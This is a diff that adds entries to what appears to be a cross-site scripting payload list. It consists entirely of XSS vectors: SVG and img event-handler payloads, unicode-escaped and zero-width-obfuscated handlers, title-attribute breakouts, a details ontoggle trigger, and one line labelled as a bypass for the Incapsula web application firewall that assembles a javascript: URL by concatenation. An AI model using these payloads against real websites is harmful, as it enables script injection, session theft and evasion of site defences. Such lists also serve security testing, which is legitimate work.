@@ -142,3 +142,8 @@ login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520docume
 <svg onxss=() onload​='setTimeout`alert\x281\x29`'>
 \u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\ u003e
 <="" script=""><script> alert("Hacked By h6nt3r");</script>
+<acronym><p title="</#{endtag}><svg/onload​=alert(#{starttag})>">
+<bgsound><p title="</#{endtag}><svg/onload​=alert(#{starttag})>">
+<xmp><p title="</#{endtag}><svg/onload​=alert(#{starttag})>">
+">'><details/open/ontoggle​=confirm('XSS')>
+incapsula bypass: <iframe/onload​="var b ='document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b;this['src']=a">
